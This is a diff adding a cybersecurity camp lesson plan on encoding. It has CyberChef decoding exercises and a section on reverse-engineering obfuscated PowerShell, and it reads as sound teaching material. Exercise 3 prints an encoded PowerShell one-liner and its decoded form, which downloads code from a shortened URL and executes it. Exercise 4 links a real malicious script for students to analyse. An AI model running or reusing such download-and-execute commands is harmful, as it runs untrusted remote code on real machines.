@@ -1,0 +1,115 @@
+Lesson 1 Details: 
+Warm Up: Start with a jumbled encoded string and have students guess what the decoded version is.  Go through multiple layers of decoding (3-4) until displaying the decoded message. Example “Who’s enjoying camp?” encoded with URL Encoding, Base 64, Base 32, and an Atbash Cipher.
+
+Lesson: Encoding plays a crucial role in cybersecurity by transforming data into different formats to protect it from unauthorized access or manipulation. One of the primary uses of encoding in cybersecurity is in the encryption of sensitive information. Through encryption algorithms, data is converted into an unreadable format, known as ciphertext, using a cryptographic key. This process ensures that even if the data is intercepted, it remains incomprehensible to unauthorized individuals. Encoding techniques such as Base64 or hexadecimal are also employed in various security mechanisms, such as web application security and email filtering, to prevent the exploitation of vulnerabilities and protect against attacks like cross-site scripting (XSS) or SQL injection. By encoding user inputs or content, potentially harmful characters or commands are transformed into harmless representations, thereby mitigating the risks associated with malicious code execution or unauthorized data manipulation.
+Encoding is used in digital signatures and certificate mechanisms to verify the authenticity and integrity of data. Encoding techniques like hashing algorithms, such as SHA-256 or MD5, generate a unique hash value based on the input data. This hash value acts as a digital fingerprint, ensuring that any changes to the data can be detected. Digital signatures combine this hash value with asymmetric encryption to provide a mechanism for verifying the identity of the sender and the integrity of the data. Encoding, in this context, ensures that any tampering or unauthorized modifications to the data would result in a different hash value, alerting the recipient to the potential compromise. 
+Overall, encoding techniques are essential tools in the cybersecurity arsenal, enabling data protection, secure communication, and the detection of tampering or unauthorized access.
+Let’s try out some examples and see if we can’t find some hidden messages!
+
+Exercise 1: 
+		Start by browsing to www.CyberChef.io.  CyberChef.io is a powerful web-based tool that simplifies data manipulation and analysis in the field of cybersecurity. It offers a user-friendly interface and a vast collection of built-in functions, allowing users to perform a wide range of data transformations, encoding, decoding, hashing, encryption, and decryption operations with ease.
+
+
+
+
+
+
+
+Each area has a use:
+INPUT: Place the string of text/file/image to be decoded in here
+RECIPE: Encoding or decoding operations that are happening to the INPUT    value.
+OPERATIONS: List of values encoding/encryption/data manipulation functions that can be added to the RECIPE
+OUTPUT: This is resulting text after you BAKE your RECIPE.  In other words, this is what is outputted after decoding your input.
+
+Let’s take this string and try to decode it:
+SXQncyBzdW1tZXIgdmFjYXRpb24hIQ==
+
+First copy this into the INPUT section of CyberChef.  Then in the OPERATION area, look or search for a “From Base64” pane.  Click and drag this into the RECIPE area.  Did something happen to your OUTPUT?
+ 
+
+You now have decoded your first hidden message!
+
+Exercise 2:
+	That’s great, but how did we know to use “From Base 64”?  Well one way is that it ended in “=”…which is a common way that Base 64 strings are padded/identified. But not all end in “=”s…so this isn’t a rule. 
+Here are some of the most common encoding techniques used in the field of cybersecurity include:
+1.	Base64 Encoding: Base64 is a widely used encoding method that converts binary data into a printable ASCII string format. It works by dividing the input data into groups of three bytes and then representing those bytes as a series of characters from a predefined set of 64 characters. Base64 encoding is commonly used for encoding binary data in formats such as email attachments, cryptographic keys, and data transmission over the internet.
+2.	Hexadecimal Encoding: Hexadecimal (or hex) encoding represents data as a sequence of hexadecimal digits (0-9 and A-F), with each digit representing four bits. It is often used to represent binary data in a human-readable format. Hexadecimal encoding is commonly employed in analyzing and manipulating binary data, debugging, and cryptographic operations.
+3.	URL Encoding: URL encoding, also known as percent-encoding, is used to represent special characters in a URL. Special characters, such as spaces or symbols, are replaced with a percent sign followed by their corresponding ASCII value in hexadecimal. This encoding ensures that URLs are correctly interpreted and transmitted across different systems without causing errors.
+4.	HTML Entity Encoding: HTML entity encoding is used to represent reserved characters or symbols in HTML documents. Characters such as <, >, &, or " are replaced with their corresponding HTML entities. This encoding prevents the browser from misinterpreting these characters as HTML markup or breaking the structure of the webpage.
+5.	UTF-8 Encoding: UTF-8 (Unicode Transformation Format 8-bit) is a character encoding scheme that represents characters from the Unicode character set. It uses variable-length encoding, where each character is represented by one to four bytes. UTF-8 encoding allows the representation of characters from multiple languages and is widely used in web applications, databases, and text files.
+6.	Binary Encoding: Binary encoding represents data in binary form, using only two symbols: 0 and 1. It is commonly used in cryptography, file compression, and data storage. Binary encoding allows precise representation and manipulation of data at the bit level.
+These encoding techniques serve different purposes in cybersecurity, from protecting data during transmission to ensuring the correct interpretation of characters in various contexts. Understanding these techniques is essential for cybersecurity professionals to analyze, decode, and manipulate encoded data effectively.
+
+Let’s try decoding some of these:
+1 57 68 79 20 64 6f 6e 27 74 20 73 63 69 65 6e 74 69 73 74 73 20 74 72 75 73 74 20 61 74 6f 6d 73 3f 20 42 65 63 61 75 73 65 20 74 68 65 79 20 6d 61 6b 65 20 75 70 20 65 76 65 72 79 74 68 69 6e 67 21
+Decoded:
+
+2 01001000 01101111 01110111 00100000 01100100 01101111 00100000 01111001 01101111 01110101 00100000 01101111 01110010 01100111 01100001 01101110 01101001 01111010 01100101 00100000 01100001 00100000 01110011 01110000 01100001 01100011 01100101 00100000 01110000 01100001 01110010 01110100 01111001 00111111 00100000 01011001 01101111 01110101 00100000 00100010 01110000 01101100 01100001 01101110 01100101 01110100 00100010 00100001
+Decoded:
+
+3What%20did%20the%20buffalo%20say%20to%20his%20son%20when%20he%20dropped%20him%20off%20at%20school?%20Bison!
+Decoded:
+
+4  V2h5JTIwZGlkJTIwdGhlJTIwYmljeWNsZSUyMGZhbGwlMjBvdmVyPyUyMEJlY2F1c2UlMjBpdCUyMHdhcyUyMHR3by10aXJlZCE=
+Decoded:
+
+5 VjJoaGRDZHpJR0VnWTI5dGNIVjBaWEluY3lCbVlYWnZjbWwwWlNCemJtRmphejhnVFdsamNtOWphR2x3Y3lFPQ==
+(HINT: encoding can have multiple iterations…once, twice, or more!...try multiples of one in your RECIPE)
+Decoded:
+
+Alright now that you’re getting the hang of it…let’s try three more challenging ones here.  These ones will require two or more steps for each.
+1  VTFOQ00ySXlOV3RhV0Vwc1drTkNNMkZJYTJka1IyaHNTVWRhZVdGWVRtbGFWMVU5
+(Hint: 3 steps and remember the = isn’t always at the end of base64)
+Decoded:
+
+2  01001111 00110101 01010001 01011000 01000111 01001010 01001010 01010011 01000111 01000010 01010100 01010111 01001011 00110101 01000100 01010101 01001110 01000110 01011000 01000111 01001111 01001010 01001010 01010011 01000111 01000010 01010010 01000111 01010011 01011010 00110011 01001000 01001101 01010110 01011010 01000011 01001011 01001101 01010010 01010001 01001101 01000110 01011000 01000111 01001001 01001010 01001010 01010011 01000111 01000010 01010010 01000111 01010011 01011010 00110011 01001000 01001101 01010110 01011010 01000001 00111101 00111101 00111101 00111101
+(Hint 3 steps…and base 32 is another operation…)
+Decoded:
+
+3  VABoAGUAbgAgAGkAdAAgAEgASQBUACAATQBFACEAIQA=
+(Hint 2 steps…and UTF-16LE (try the Decode Text operation) likes to l.o.o.k. .l.i.k.e. .t.h.i.s. 
+Decoded:
+
+Exercise 3:
+    One of the ways that malicious actors like to hide their steps and bypass anti-virus/anti-malware is to multiple layers of encoding to help hide their true meaning.
+PowerShell obfuscation refers to the technique of deliberately making PowerShell code more complex and difficult to understand or analyze. Obfuscation involves modifying the structure, syntax, and naming conventions of the code, making it challenging for security researchers, antivirus software, or other analysis tools to identify and comprehend the script's intent.
+Obfuscation, in the context of cybersecurity, is the process of intentionally obscuring the true purpose or functionality of code, making it harder to decipher or reverse engineer. Malicious actors employ obfuscation techniques to evade detection, hinder analysis, and increase the chances of successful execution of their malicious activities. By obfuscating their PowerShell code, attackers can camouflage their intentions, bypass security controls, and increase the effectiveness of their attacks. This technique makes it difficult for defenders to identify and mitigate threats, as the obfuscated code can evade traditional signature-based detection methods and hinder analysis by automated tools. Ultimately, obfuscation is used by malicious actors to enhance the stealth, persistence, and success rates of their cyberattacks.
+Let’s take a look at this Powershell command:
+powershell.exe -e aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA
+Sure looks like a lot of nothing…but if you try running it in a Powershell prompt…it seems to run something:
+ 
+But how does it do that?
+
+Let’s breakdown this Powershell One-liner: 
+Powershell.exe  Calls on powershell to execute whatever cmdlet’s follow
+-e  specifies that the following is “encoded”
+aQBlAHgAIAA…CkA  long block of encoded text
+
+Let’s see if there’s anything that we can do to decode that block of text using CyberChef.
+1.	aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA
+Decoded:
+
+Now let’s put that whole command together: 
+Powershell.exe -e iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
+
+A little easier to understand what is going on now to a cybersecurity analyst.  The “iex” tells the computer to invoke the expression following it, which in this case is the New-Object cmdlet calling on the internet web client to download the payload from the site http://bit.ly/e0Mw9w.  This code is then executed…resulting in a hilarious result. 
+
+Exercise 4 (last one):
+Now that you have an idea of how a cybersecurity analyst takes a potentially malicious and obfuscated command, and reverse engineers it to an easily readable format…let’s see what kind of information you can get from the following malicious Powershell:
+Copy the powershell command in the GenCyber Github found here: https://github.com/LSCCyberHawks/GenCyber2023/blob/main/Wednesday/powershelldecode.txt
+Use your skills…and some additional Operations (char, splits, and replace are all available)
+
+
+What “security protocol” is being used for the communication with a malicious domain?
+*****
+What directory does this script create? (Starting from \HOME)
+\HOME\**_****\*******\
+What is the file being downloaded (full name)?
+****.dll
+What is “run”ing (or executing) the downloaded file?
+******32
+What is the domain name of the URI ending in ‘/6F2gd/’
+**.*********.net
+Based on the analysis of the obfuscated code, what is the name of the malware?
+******
+You might want to research that file being downloaded or the domain name you found.
